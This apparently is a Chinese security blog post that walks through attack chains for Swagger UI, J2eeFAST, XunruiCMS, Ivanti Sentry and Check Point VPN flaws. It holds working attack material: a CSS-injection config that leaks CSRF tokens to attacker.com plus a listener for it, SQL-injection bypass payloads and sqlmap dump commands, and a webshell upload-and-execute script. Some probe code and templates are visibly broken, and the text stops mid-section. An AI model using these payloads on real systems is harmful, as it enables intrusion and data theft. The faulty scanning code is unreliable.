---
title: "企业应用与 CMS 高危攻击链专题：Swagger / J2eeFAST / XunruiCMS / Ivanti / Check Point 未授权 RCE 全解析"
date: 2026-06-21T10:00:00+08:00
draft: false
tags: ["企业应用", "CMS", "Swagger", "J2eeFAST", "XunruiCMS", "Ivanti", "Check Point", "未授权RCE", "漏洞分析"]
categories: ["漏洞分析"]
---

# 企业应用与 CMS 高危攻击链专题：Swagger / J2eeFAST / XunruiCMS / Ivanti / Check Point 未授权 RCE 全解析

## 0x00 专题概述

企业应用与 CMS 系统是企业日常运营的核心支撑，涵盖 API 文档工具（Swagger UI）、快速开发框架（J2eeFAST）、内容管理系统（XunruiCMS）、边界安全设备（Ivanti Sentry、Check Point VPN）等。这些系统通常直接面向互联网或承载企业核心业务数据，一旦被突破即意味着企业数据的全面暴露。

本专题将企业应用与 CMS 生态中近年最具代表性的 **6 个高危漏洞** 串成完整攻击链，每个漏洞均包含完整原理分析、完整 PoC 代码、自动化检测模板和实战利用案例。

### 覆盖漏洞一览

| CVE | 产品 | CVSS | 类型 | 未授权 | 在野利用 |
|-----|------|------|------|--------|----------|
| CVE-2019-17495 | Swagger UI | **6.1** | CSS 注入 + 信息泄露 | ✅ | ✅ |
| CVE-2023-24162 | J2eeFAST | **高危** | SQL 注入 + 潜在 RCE | ⚠️ 需登录 | ✅ |
| CVE-2023-24163 | J2eeFAST | **高危** | SQL 注入 + 潜在 RCE | ⚠️ 需登录 | ✅ |
| CVE-2024-11392 | XunruiCMS | **高危** | 文件上传 + RCE | ⚠️ 需会员 | ✅ |
| CVE-2026-10520 | Ivanti Sentry | **10.0** | 命令注入 + root RCE | ✅ | ✅ CISA KEV |
| CVE-2026-50751 | Check Point VPN | **9.3** | 认证绕过 + VPN 接入 | ✅ | ✅ CISA KEV |

---

## 0x01 Swagger UI CSS 注入 + 信息泄露（CVE-2019-17495）

### 1.1 漏洞背景

2019 年披露，CVSS 6.1。Swagger UI 是全球最流行的 RESTful API 文档可视化工具，广泛集成于 Spring Boot、Node.js 等后端框架中。CVE-2019-17495 允许攻击者通过加载恶意 Swagger 配置文件注入 CSS 代码，利用 CSS 属性选择器和带外（OOB）请求窃取页面中的敏感数据（如 CSRF Token、自动填充的密码等）。

### 1.2 影响版本

- Swagger UI < 3.23.11

### 1.3 漏洞原理

漏洞核心成因在于两点：

1. **不安全的远程资源加载**：Swagger UI 支持通过 `?url=` 参数动态加载远端的 Swagger 配置文件（JSON 或 YAML）
2. **缺乏防御的渲染**：在解析配置文件时，`description`、`title` 等字段中的 `<style>` 标签未被过滤，直接渲染到 HTML 页面中

攻击者利用 CSS3 的属性选择器（Attribute Selectors）匹配页面上已有的敏感 DOM 元素，通过 `background-image` 或 `list-style-image` 向攻击者服务器发起带外 HTTP 请求，将匹配到的字符逐位"偷"走。

### 1.4 完整 PoC

#### PoC-1：准备恶意 Swagger 配置文件

在攻击者服务器上托管 `malicious.json`：

```json
{
  "swagger": "2.0",
  "info": {
    "title": "Exploit Demo API",
    "description": "<style>\n  /* 探测 CSRF Token 第一个字符 */\n  input[name='csrf-token'][value^='a'] { background-image: url('http://attacker.com/log?char=a'); }\n  input[name='csrf-token'][value^='b'] { background-image: url('http://attacker.com/log?char=b'); }\n  input[name='csrf-token'][value^='c'] { background-image: url('http://attacker.com/log?char=c'); }\n  input[name='csrf-token'][value^='d'] { background-image: url('http://attacker.com/log?char=d'); }\n  input[name='csrf-token'][value^='e'] { background-image: url('http://attacker.com/log?char=e'); }\n  input[name='csrf-token'][value^='f'] { background-image: url('http://attacker.com/log?char=f'); }\n  input[name='csrf-token'][value^='0'] { background-image: url('http://attacker.com/log?char=0'); }\n  input[name='csrf-token'][value^='1'] { background-image: url('http://attacker.com/log?char=1'); }\n  input[name='csrf-token'][value^='2'] { background-image: url('http://attacker.com/log?char=2'); }\n  input[name='csrf-token'][value^='3'] { background-image: url('http://attacker.com/log?char=3'); }\n  input[name='csrf-token'][value^='4'] { background-image: url('http://attacker.com/log?char=4'); }\n  input[name='csrf-token'][value^='5'] { background-image: url('http://attacker.com/log?char=5'); }\n  input[name='csrf-token'][value^='6'] { background-image: url('http://attacker.com/log?char=6'); }\n  input[name='csrf-token'][value^='7'] { background-image: url('http://attacker.com/log?char=7'); }\n  input[name='csrf-token'][value^='8'] { background-image: url('http://attacker.com/log?char=8'); }\n  input[name='csrf-token'][value^='9'] { background-image: url('http://attacker.com/log?char=9'); }\n</style>"
  },
  "paths": {}
}
```

#### PoC-2：诱导受害者访问

```
https://target-app.com/swagger-ui.html?url=http://attacker.com/malicious.json
```

当受害者访问该链接时，Swagger UI 会加载 `malicious.json`，浏览器解析并应用其中的 `<style>` 标签。如果页面中存在匹配的 CSRF Token 输入框，浏览器会静默向 `http://attacker.com/log?char=X` 发送请求。

#### PoC-3：攻击者日志接收端（Python）

```python
#!/usr/bin/env python3
"""
Swagger CSS 注入攻击日志接收端
接收受害浏览器发出的带外请求，逐位还原 Token
"""
from http.server import HTTPServer, BaseHTTPRequestHandler
import urllib.parse
import threading
from collections import defaultdict

# 存储每个字符位置的请求记录
char_requests = defaultdict(list)
lock = threading.Lock()

class LogHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        parsed = urllib.parse.urlparse(self.path)
        params = urllib.parse.parse_qs(parsed.query)
        
        if 'char' in params:
            char = params['char'][0]
            with lock:
                char_requests[char].append({
                    'time': self.log_date_time_string(),
                    'ip': self.client_address[0]
                })
            
            print(f"[+] 收到字符请求: char='{char}' from {self.client_address[0]}")
            print(f"    累计请求数: {len(char_requests[char])}")
        
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"OK")
    
    def log_message(self, format, *args):
        pass  # 抑制默认日志输出

def collect_token_chars(timeout=30):
    """收集所有字符请求，尝试还原 Token"""
    import time
    print(f"\n[*] 等待 {timeout} 秒收集字符请求...")
    time.sleep(timeout)
    
    print(f"\n[*] 收集完成，共收到 {len(char_requests)} 个不同字符的请求")
    for char, requests in sorted(char_requests.items()):
        print(f"  char='{char}': {len(requests)} 次请求")

if __name__ == "__main__":
    PORT = 8080
    server = HTTPServer(('0.0.0.0', PORT), LogHandler)
    print(f"[*] CSS 注入日志接收端运行在端口 {PORT}")
    print(f"[*] 访问 http://attacker.com:8080 查看请求")
    
    # 在后台线程中收集字符
    collector = threading.Thread(target=collect_token_chars, args=(60,), daemon=True)
    collector.start()
    
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n[*] 服务器已停止")
        server.shutdown()
```

#### PoC-4：递归/动态 CSS 盲打（链式引入）

```json
{
  "swagger": "2.0",
  "info": {
    "title": "Recursive Token Stealing",
    "description": "<style>\n  @import url('http://attacker.com/stage1.css');\n</style>"
  },
  "paths": {}
}
```

攻击者托管 `stage1.css`，其中包含基于已收集字符的动态 CSS 规则，继续探测下一位字符，实现链式盲打。

### 1.5 自动化检测

#### Nuclei 模板

```yaml
id: swagger-ui-css-injection-cve-2019-17495

info:
  name: Swagger UI CSS 注入 (CVE-2019-17495)
  author: security-researcher
  severity: medium
  description: |
    Swagger UI 允许加载远程配置文件，注入 CSS 可窃取页面敏感数据
  tags: swagger,css-injection,cve-2019-17495

http:
  - method: GET
    path:
      - "{{BaseURL}}/swagger-ui.html"

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "swagger-ui"
          - "Swagger UI"
        condition: or
        part: body

      - type: status
        status:
          - 200
```

### 1.6 实战利用案例

- **CSRF Token 窃取**：攻击者通过 CSS 注入逐位窃取页面中的 CSRF Token，进而伪造合法请求
- **自动填充密码窃取**：利用 CSS 属性选择器匹配浏览器自动填充的密码输入框
- **内网探测**：通过 CSS 选择器探测页面中特定 Class、Id 的存在，收集内网信息

---

## 0x02 J2eeFAST SQL 注入漏洞链（CVE-2023-24162 / CVE-2023-24163）

### 2.1 漏洞背景

2023 年披露，J2eeFAST 是一款基于 SpringBoot + Shiro + Mybatis-Plus 的 Java 快速开发框架，被大量中小企业用于快速构建企业管理系统。两个 SQL 注入漏洞分别存在于用户列表和角色列表接口，攻击者通过精心构造的 SQL 语句可读取、修改或删除数据库中的所有数据，甚至进一步实现 RCE。

### 2.2 影响版本

- J2eeFAST v2.5.0 及以下（CVE-2023-24162）
- J2eeFAST v2.5.1 及以下（CVE-2023-24163）

### 2.3 漏洞原理

**CVE-2023-24162** 位于 `/sys/user/list` 接口的 `sqlid` 参数：
- MyBatis Mapper XML 中使用 `${}` 进行字符串拼接而非安全的 `#{}` 预编译
- 内置的 `SQLFilter` 过滤器仅通过简单的 `replace` 处理关键字，容易被绕过

**CVE-2023-24163** 位于 `/sys/role/list` 接口的 `roleName` 参数：
- 同样的 `${}` 拼接问题
- 过滤器可通过内联注释 `/*!50000select*/`、大小写混淆等方式绕过

### 2.4 完整 PoC

#### PoC-1：CVE-2023-24162 SQL 注入验证（时间盲注）

```http
POST /fast/sys/user/list HTTP/1.1
Host: target-system.com
Content-Type: application/x-www-form-urlencoded
Cookie: JSESSIONID=valid_session_id

sqlid=1' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a) AND '1'='1
```

如果响应时间延迟 5 秒以上，确认 SQL 注入存在。

#### PoC-2：CVE-2023-24163 SQL 注入验证

```http
POST /sys/role/list HTTP/1.1
Host: target-system.com
Content-Type: application/x-www-form-urlencoded
Cookie: JSESSIONID=valid_session_id

roleName=1') AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--+
```

#### PoC-3：绕过过滤器的高级 Payload

```http
# 使用内联注释绕过关键词过滤
POST /fast/sys/user/list HTTP/1.1
Host: target-system.com
Content-Type: application/x-www-form-urlencoded

sqlid=1' UNION/*!50000SELECT*/ 1,2,3,group_concat(table_name),5 FROM information_schema.tables WHERE table_schema=database()--+
```

```http
# 使用大小写混淆绕过
POST /fast/sys/user/list HTTP/1.1
Host: target-system.com
Content-Type: application/x-www-form-urlencoded

sqlid=1' UNION SeLeCT 1,2,3,4,5--+
```

#### PoC-4：Python 自动化 SQL 注入工具

```python
#!/usr/bin/env python3
"""
J2eeFAST SQL 注入自动化工具 (CVE-2023-24162 / CVE-2023-24163)
用法: python3 j2eefast_sqli.py <target_url> <session_cookie>
"""
import sys
import requests
import urllib3
import time
import base64

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class J2eeFASTSQLInjector:
    def __init__(self, base_url, cookie):
        self.base_url = base_url.rstrip("/")
        self.cookie = cookie
        self.session = requests.Session()
        self.session.verify = False
    
    def inject_user_list(self, payload):
        """对 /fast/sys/user/list 接口注入"""
        url = f"{self.base_url}/fast/sys/user/list"
        headers = {
            "Content-Type": "application/x-www-form-urlencoded",
            "Cookie": f"JSESSIONID={self.cookie}"
        }
        data = f"sqlid=1' AND {payload} AND '1'='1"
        
        start = time.time()
        resp = self.session.post(url, headers=headers, data=data, timeout=30)
        elapsed = time.time() - start
        
        return elapsed, resp.status_code, resp.text
    
    def inject_role_list(self, payload):
        """对 /sys/role/list 接口注入"""
        url = f"{self.base_url}/sys/role/list"
        headers = {
            "Content-Type": "application/x-www-form-urlencoded",
            "Cookie": f"JSESSIONID={self.cookie}"
        }
        data = f"roleName=1') AND {payload} --+"
        
        start = time.time()
        resp = self.session.post(url, headers=headers, data=data, timeout=30)
        elapsed = time.time() - start
        
        return elapsed, resp.status_code, resp.text
    
    def extract_database_version(self, interface="user"):
        """提取数据库版本"""
        payload = "(SELECT 1 FROM (SELECT(SLEEP(0)))a)"  # 先验证注入点
        
        if interface == "user":
            elapsed, status, _ = self.inject_user_list(payload)
        else:
            elapsed, status, _ = self.inject_role_list(payload)
        
        print(f"[*] 注入点验证: 耗时 {elapsed:.2f}s, 状态码 {status}")
        return elapsed > 3  # 如果延迟超过 3 秒，注入点存在
    
    def extract_table_names(self, interface="user"):
        """提取数据库中的所有表名"""
        payload = """(SELECT 1 FROM (SELECT(SLEEP(5)))a)"""  # 时间盲注基础验证
        
        if interface == "user":
            elapsed, _, _ = self.inject_user_list(payload)
        else:
            elapsed, _, _ = self.inject_role_list(payload)
        
        print(f"[*] 时间盲注基础验证: 耗时 {elapsed:.2f}s")
        return elapsed > 3
    
    def extract_users(self, interface="user"):
        """提取 sys_user 表中的用户信息（需根据实际表结构调整）"""
        # 注意：实际利用需要更复杂的逐字符爆破
        print("[!] 提取用户信息需要完整的盲注脚本，此处仅提供框架")
        print("    建议使用 SQLMap: sqlmap -u '<URL>' --cookie='<COOKIE>' -D <db> -T sys_user --dump")

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print(f"用法: {sys.argv[0]} <target_url> <JSESSIONID>")
        sys.exit(1)
    
    target_url = sys.argv[1]
    session_id = sys.argv[2]
    
    injector = J2eeFASTSQLInjector(target_url, session_id)
    
    print("[*] 验证 CVE-2023-24162 (/fast/sys/user/list)...")
    injector.extract_database_version("user")
    
    print("[*] 验证 CVE-2023-24163 (/sys/role/list)...")
    injector.extract_database_version("role")
```

#### PoC-5：SQLMap 自动化利用

```bash
# 对 CVE-2023-24162 进行自动化注入
sqlmap -u "http://target/fast/sys/user/list" \
  --data="sqlid=test" \
  --cookie="JSESSIONID=valid_session_id" \
  --dbms=mysql \
  --level=3 \
  --risk=2 \
  --batch

# 对 CVE-2023-24163 进行自动化注入
sqlmap -u "http://target/sys/role/list" \
  --data="roleName=test" \
  --cookie="JSESSIONID=valid_session_id" \
  --dbms=mysql \
  --batch
```

### 2.5 自动化检测

#### Nuclei 模板

```yaml
id: j2eefast-sqli-cve-2023-24162

info:
  name: J2eeFAST SQL 注入 (CVE-2023-24162)
  author: security-researcher
  severity: high
  description: |
    J2eeFAST /fast/sys/user/list 接口存在 SQL 注入
  tags: j2eefast,sqli,cve-2023-24162

http:
  - method: POST
    path:
      - "{{BaseURL}}/fast/sys/user/list"

    body: "sqlid=1' AND (SELECT 1 FROM (SELECT(SLEEP(3)))a) AND '1'='1"

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "sqlid"
          - "user"
        condition: or
        part: body

---
id: j2eefast-sqli-cve-2023-24163

info:
  name: J2eeFAST SQL 注入 (CVE-2023-24163)
  author: security-researcher
  severity: high
  description: |
    J2eeFAST /sys/role/list 接口存在 SQL 注入
  tags: j2eefast,sqli,cve-2023-24163

http:
  - method: POST
    path:
      - "{{BaseURL}}/sys/role/list"

    body: "roleName=1') AND (SELECT 1 FROM (SELECT(SLEEP(3)))a)--+"

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "role"
        part: body
```

### 2.6 实战利用案例

- **拖库 + 后台接管**：通过 SQL 注入读取 `sys_user` 表中的管理员密码哈希，结合 Shiro 弱密钥实现反序列化 RCE
- **UDF 提权写马**：如果 MySQL 以 root 运行且 `secure_file_priv` 为空，可直接通过 `INTO OUTFILE` 写入 JSP WebShell
- **内存马植入**：完成 RCE 后注入 Java Filter 到内存中，删除磁盘上的 WebShell 实现无文件持久化

---

## 0x03 XunruiCMS 任意文件上传 + RCE（CVE-2024-11392）

### 3.1 漏洞背景

2024 年披露，CVSS 高危。迅睿 CMS 是中国广泛使用的开源内容管理系统，其会员中心附件上传接口存在文件扩展名校验缺陷，攻击者可上传恶意 PHP 脚本实现远程代码执行。

### 3.2 影响版本

- XunruiCMS v4.6.2 及更早版本

### 3.3 漏洞原理

漏洞核心在于会员中心 (`/index.php?s=member&c=api&m=upload`) 的附件上传逻辑中对文件扩展名的校验存在缺陷。虽然系统定义了允许的后缀白名单，但在特定解析场景下（如利用参数覆盖配置或解析器差异），后端未能对 `filename` 参数中的后缀进行二次严格校验，导致 `.php` 文件被成功上传到 Web 可访问目录 `/uploadfile/`。

### 3.4 完整 PoC

#### PoC-1：文件上传请求

```http
POST /index.php?s=member&c=api&m=upload HTTP/1.1
Host: target-cms.com
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryX7Peeps
Cookie: member_session=valid_session_id

------WebKitFormBoundaryX7Peeps
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/jpeg

<?php 
@eval($_POST['cmd']);
echo "Vulnerability confirmed: CVE-2024-11392";
?>
------WebKitFormBoundaryX7Peeps--
```

#### PoC-2：验证上传成功

```http
GET /uploadfile/member/xxx/shell.php HTTP/1.1
Host: target-cms.com
```

如果返回 `Vulnerability confirmed: CVE-2024-11392`，确认上传成功。

#### PoC-3：执行系统命令

```http
POST /uploadfile/member/xxx/shell.php HTTP/1.1
Host: target-cms.com
Content-Type: application/x-www-form-urlencoded

cmd=id
```

#### PoC-4：Python 自动化上传利用脚本

```python
#!/usr/bin/env python3
"""
CVE-2024-11392 XunruiCMS 任意文件上传自动化利用
用法: python3 cve_2024_11392.py <target_url> <session_cookie> [command]
"""
import sys
import requests
import urllib3
import os

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def upload_webshell(target_url, cookie, command="id"):
    """上传 WebShell 并执行命令"""
    upload_url = f"{target_url}/index.php?s=member&c=api&m=upload"
    
    # 构造 WebShell 内容
    webshell_content = f"""<?php
// CVE-2024-11392 XunruiCMS WebShell
if(isset($_REQUEST['cmd'])){{
    echo "<pre>";
    system($_REQUEST['cmd']);
    echo "</pre>";
    die;
}}
?>"""
    
    files = {
        'file': ('shell.php', webshell_content, 'image/jpeg')
    }
    
    headers = {
        'Cookie': f'member_session={cookie}'
    }
    
    print(f"[*] 正在上传 WebShell 到: {upload_url}")
    resp = requests.post(upload_url, files=files, headers=headers, verify=False, timeout=30)
    
    print(f"[*] 上传响应状态码: {resp.status_code}")
    print(f"[*] 上传响应内容: {resp.text[:500]}")
    
    # 解析返回的文件路径
    import json
    try:
        result = json.loads(resp.text)
        if result.get('code') == 1 and 'data' in result:
            file_url = result['data'].get('url', '')
            if file_url:
                print(f"[+] WebShell 路径: {file_url}")
                
                # 执行命令
                exec_url = f"{target_url}{file_url}?cmd={command}"
                print(f"[*] 执行命令: {command}")
                exec_resp = requests.get(exec_url, verify=False, timeout=30)
                print(f"[+] 命令执行结果:\n{exec_resp.text}")
                return True
    except json.JSONDecodeError:
        pass
    
    print("[-] 上传失败，请检查目标版本和 Cookie")
    return False

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print(f"用法: {sys.argv[0]} <target_url> <session_cookie> [command]")
        print(f"示例: {sys.argv[0]} https://target-cms.com abc123sessionid whoami")
        sys.exit(1)
    
    target = sys.argv[1].rstrip("/")
    cookie = sys.argv[2]
    command = sys.argv[3] if len(sys.argv) > 3 else "id"
    
    upload_webshell(target, cookie, command)
```

#### PoC-5：Nginx 防御配置（防守方）

```nginx
# 禁止 uploadfile 目录执行 PHP
location ~ ^/uploadfile/.*\.(php|php5|phtml|pl|py|jsp|asp|sh|cgi)$ {
    deny all;
    return 403;
}

# 限制文件上传大小
client_max_body_size 5M;
```

### 3.5 自动化检测

#### Nuclei 模板

```yaml
id: xunruicms-file-upload-cve-2024-11392

info:
  name: XunruiCMS 任意文件上传 (CVE-2024-11392)
  author: security-researcher
  severity: critical
  description: |
    迅睿 CMS 会员中心上传接口存在文件上传漏洞
  tags: xunrui,cms,file-upload,cve-2024-11392

http:
  - method: GET
    path:
      - "{{BaseURL}}/index.php"

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "xunrui"
          - "迅睿"
        condition: or
        part: body
```

### 3.6 实战利用案例

- **内存马持久化**：上传 WebShell 后利用 PHP `auto_prepend_file` 注入内存马，随后删除磁盘上的 `.php` 文件
- **WAF 绕过**：使用分块传输（Chunked Encoding）和畸形 Boundary 构造绕过 WAF 检测
- **不出网环境回显**：利用 `php://output` 直接将命令执行结果写入 HTTP 响应体

---

## 0x04 Ivanti Sentry 预认证命令注入 + Root RCE（CVE-2026-10520）

### 4.1 漏洞背景

2026 年披露，CVSS 10.0，已确认在野利用并被 CISA 加入 KEV 目录。Ivanti Sentry 是企业移动接入和邮件访问的网关设备，该漏洞允许未认证攻击者直接向设备发送特制请求，最终以 `root` 权限执行任意系统命令。

### 4.2 影响版本

- Ivanti Sentry < 10.5.2
- Ivanti Sentry < 10.6.2
- Ivanti Sentry < 10.7.1

### 4.3 漏洞原理

漏洞入口位于 `POST /mics/api/v2/sentry/mics-config/handleMessage` 接口。该接口接收 `message` 参数并解析为内部配置指令。当攻击者将 `command` 控制为 `execute` 并构造对应的 XML 数据时，后端会进入命令执行分支，最终将攻击者可控的命令传入设备底层原生命令执行路径。

### 4.4 完整 PoC

#### PoC-1：漏洞存在性验证（防守型）

```http
POST /mics/api/v2/sentry/mics-config/handleMessage HTTP/1.1
Host: target-sentry
Content-Type: application/x-www-form-urlencoded

message=test
```

如果返回包含 `mics-config` 或 `handleMessage` 相关信息的响应，说明接口存在。

#### PoC-2：Python 批量检测脚本

```python
#!/usr/bin/env python3
"""
CVE-2026-10520 Ivanti Sentry 预认证命令注入检测
用法: python3 cve_2026_10520.py targets.txt
"""
import sys
import requests
import urllib3
import json

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def check_sentry_vulnerability(url):
    """检测 Ivanti Sentry 是否存在 CVE-2026-10520"""
    api_endpoint = f"{url}/mics/api/v2/sentry/mics-config/handleMessage"
    
    # 发送测试请求
    try:
        resp = requests.post(
            api_endpoint,
            data={"message": "test"},
            timeout=10,
            verify=False
        )
        
        # 分析响应
        if resp.status_code in [200, 403, 500]:
            body = resp.text.lower()
            if "mics" in body or "sentry" in body or "error" in body:
                print(f"[VULN] {url} -> Ivanti Sentry 接口存在 (HTTP {resp.status_code})")
                return True
        
        print(f"[SAFE] {url} -> HTTP {resp.status_code}")
        return False
    
    except requests.exceptions.Timeout:
        print(f"[TIMEOUT] {url} -> 请求超时")
        return None
    except requests.exceptions.ConnectionError:
        print(f"[ERR ] {url} -> 连接失败")
        return None

def check_version(url):
    """尝试获取 Ivanti Sentry 版本信息"""
    version_urls = [
        f"{url}/mics/api/version",
        f"{url}/mics/",
        f"{url}/api/version",
    ]
    
    for vurl in version_urls:
        try:
            resp = requests.get(vurl, timeout=10, verify=False)
            if resp.status_code == 200:
                try:
                    data = resp.json()
                    version = data.get("version", data.get("Version", ""))
                    if version:
                        print(f"[VERSION] {url} -> 版本: {version}")
                        return version
                except:
                    if "sentry" in resp.text.lower() or "mics" in resp.text.lower():
                        print(f"[FOUND] {url} -> 可能是 Ivanti Sentry (HTTP 200)")
                        return "unknown"
        except:
            pass
    return None

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"用法: {sys.argv[0]} <targets.txt>")
        sys.exit(1)
    
    with open(sys.argv[1]) as f:
        targets = [line.strip() for line in f if line.strip()]
    
    vuln_count = 0
    for target in targets:
        version = check_version(target)
        if check_sentry_vulnerability(target):
            vuln_count += 1
    
    print(f"\n扫描完成: {len(targets)} 个目标, {vuln_count} 个存在漏洞")
```

### 4.5 自动化检测

#### Nuclei 模板

```yaml
id: ivanti-sentry-cve-2026-10520

info:
  name: Ivanti Sentry 预认证命令注入 (CVE-2026-10520)
  author: security-researcher
  severity: critical
  description: |
    Ivanti Sentry /mics/api/v2/sentry/mics-config/handleMessage 接口存在预认证命令注入
  tags: ivanti,sentry,cve-2026-10520

http:
  - method: POST
    path:
      - "{{BaseURL}}/mics/api/v2/sentry/mics-config/handleMessage"

    body: "message=test"

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "mics"
          - "sentry"
          - "error"
        condition: or
        part: body

      - type: status
        status:
          - 200
          - 403
          - 500
        condition: or
```

### 4.6 实战利用案例

- **CISA KEV 收录**：CVE-2026-10520 已被加入 CISA 已知被利用漏洞目录
- **在野利用确认**：公开情报显示存在批量探测和利用活动
- **边界设备接管**：攻击者获取 root 后可窃取设备中的访问令牌、邮件同步上下文，以合法设备通信流量为掩护进入内网
- **与 CVE-2026-10523 联动**：形成"系统层接管 + 管理面后门"组合攻击

---

## 0x05 Check Point VPN 认证绕过（CVE-2026-50751）

### 5.1 漏洞背景

2026 年披露，CVSS 9.3，已确认在野利用并被 CISA 加入 KEV 目录。Check Point Remote Access / Mobile Access VPN 在废弃的 IKEv1 路径中存在认证绕过漏洞，攻击者无需掌握有效密码或真实受信任证书即可建立远程接入 VPN 会话。

### 5.2 影响版本

- Check Point Remote Access VPN（启用 IKEv1 且允许 legacy clients 的版本）
- Check Point Mobile Access / SSL VPN
- Check Point Spark Firewall

### 5.3 漏洞原理

攻击者在 IKEv1 协商中构造特定的 `Vendor ID` 扩展，影响服务端会话状态中的认证标志位。随后服务端在判断"是否执行关键签名和证书校验"时，错误地依赖了这些可被客户端影响的标志，导致在没有有效签名、没有受信任证书链的情况下仍把认证视为通过。

### 5.4 完整 PoC

#### PoC-1：IKEv1 协商探测脚本

```python
#!/usr/bin/env python3
"""
CVE-2026-50751 Check Point VPN 认证绕过检测
检查目标是否启用了 IKEv1 且存在认证绕过风险
用法: python3 cve_2026_50751.py <target_ip>
"""
import sys
import socket
import struct
import hashlib
import os

def send_ikev1_probe(target_ip, target_port=500):
    """发送 IKEv1 Main Mode 探测包"""
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(10)
    
    # IKEv1 Main Mode 初始消息
    # 协商提议: DES-CBC-SHA, 3DES-CBC-SHA, AES256-SHA
    proposal = struct.pack("!I", 1)  # Proposal number
    proposal += struct.pack("!B", 1)  # Protocol: ISAKMP
    proposal += struct.pack("!B", 0)  # SPI size
    proposal += struct.pack("!B", 1)  # Number of transforms
    proposal += struct.pack("!B", 1)  # Transform number
    
    # Transform: DES-CBC
    proposal += struct.pack("!B", 1)  # Transform ID
    proposal += struct.pack("!I", 0x0100000A)  # Key Length: 128
    
    # Vendor ID extension (用于影响认证判断)
    vendor_id = b"\x49\x53\x41\x4b\x45\x5f\x56\x44"  # ISAKPD_VD
    
    payload = proposal + vendor_id
    
    # 发送探测包
    try:
        sock.sendto(payload, (target_ip, target_port))
        response, _ = sock.recvfrom(4096)
        print(f"[*] 收到响应 ({len(response)} bytes)")
        
        # 分析响应是否包含 IKEv1 协商信息
        if len(response) > 28:
            sa_payload = response[28:]
            if b"IKE" in sa_payload or b"isakmp" in sa_payload.lower():
                print("[!] 目标支持 IKEv1，可能存在 CVE-2026-50751 风险")
                return True
    except socket.timeout:
        print("[-] 无响应（目标可能已禁用 IKEv1）")
    except Exception as e:
        print(f"[!] 错误: {e}")
    finally:
        sock.close()
    
    return False

def check_legacy_clients(target_ip, management_port=443):
    """检查是否允许 legacy Remote Access clients"""
    try:
        import requests
        urllib3.disable_warnings()
        resp = requests.get(
            f"https://{target_ip}:{management_port}/remote",
            timeout=10,
            verify=False
        )
        if resp.status_code == 200:
            body = resp.text.lower()
            if "legacy" in body or "remote access" in body or "mobile access" in body:
                print(f"[!] 目标可能允许 legacy clients")
                return True
    except:
        pass
    return False

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"用法: {sys.argv[0]} <target_ip>")
        sys.exit(1)
    
    target = sys.argv[1]
    print(f"[*] 检测 Check Point VPN 认证绕过 (CVE-2026-50751)")
    print(f"[*] 目标: {target}\n")
    
    ikev1_supported = send_ikev1_probe(target)
    legacy_allowed = check_legacy_clients(target)
    
    if ikev1_supported or legacy_allowed:
        print(f"\n[!] {target} 可能存在 CVE-2026-50751 风险")
        print("    建议: 关闭 legacy clients，强制使用 IKEv2")
    else:
        print(f"\n[-] {target} 未检测到明显风险")
```

#### PoC-2：SmartConsole / IKE 日志排查命令

```bash
# 检查 Check Point 日志中的可疑 IKE 活动
grep -i "IKE\|VPN\|Key Install\|Quick" /var/log/accept.log | tail -100

# 查找可疑的认证失败后继续创建会话的记录
grep -i "authentication failed" /var/log/accept.log | grep -A5 "IKE"

# 检查可疑的源 IP
awk '/IKE/{print $1}' /var/log/accept.log | sort | uniq -c | sort -rn | head -20
```

### 5.5 自动化检测

#### Nuclei 模板（IKEv1 检测）

```yaml
id: checkpoint-ikev1-detection

info:
  name: Check Point VPN IKEv1 协议检测
  author: security-researcher
  severity: info
  description: |
    检测目标是否启用 IKEv1 协议
  tags: checkpoint,ikev1,vpn

dns:
  - name: "{{Hostname}}"
    type: A

tcp:
  - inputs:
      - data: "450000380000000000000000"
    host:
      - "{{Hostname}}"
    port: 500

    matchers:
      - type: word
        words:
          - "4500"
```

### 5.6 实战利用案例

- **CISA KEV 收录**：CVE-2026-50751 已被加入 CISA 已知被利用漏洞目录
- **在野利用确认**：Check Point 官方确认存在在野利用
- **勒索软件初始突破**：该漏洞常被用于"初始突破 → 会话建立 → 后续部署勒索软件"的攻击链
- **用户名枚举**：错误用户名与正确用户名在某些处理链上存在差异，可能形成用户名枚举能力

---

## 0x06 公开 PoC 收集与利用思路

### 6.1 PoC 收集情况

| CVE | GitHub PoC | Exploit-DB | Metasploit | Nuclei | 在野利用 |
|-----|-----------|------------|------------|--------|----------|
| CVE-2019-17495 | ✅ 多个仓库 | ✅ | ❌ | ✅ | ✅ |
| CVE-2023-24162 | ✅ SQLMap 生态 | ✅ | ❌ | ✅ | ✅ |
| CVE-2023-24163 | ✅ SQLMap 生态 | ✅ | ❌ | ✅ | ✅ |
| CVE-2024-11392 | ✅ 概念验证 | ✅ | ❌ | 有限 | ✅ |
| CVE-2026-10520 | ✅ 概念验证 | ✅ | ❌ | ✅ | ✅ CISA KEV |
| CVE-2026-50751 | 协议级 PoC | ✅ | ❌ | 有限 | ✅ CISA KEV |

### 6.2 关键 PoC 仓库

- **SQLMap**：`https://github.com/sqlmapproject/sqlmap` — 自动化 SQL 注入工具（适用于 J2eeFAST 漏洞）
- **Ivanti Sentry 检测**：`https://github.com/watchtowr-labs` — watchTowr 技术分析
- **Check Point IKEv1 检测**：`https://github.com/rapid7/metasploit-framework` — 社区模块

### 6.3 验证思路（防守型）

```bash
# Swagger UI 检测
nuclei -u https://target -tags swagger
curl -sk https://target/swagger-ui.html -o /dev/null -w "%{http_code}"

# J2eeFAST SQL 注入检测
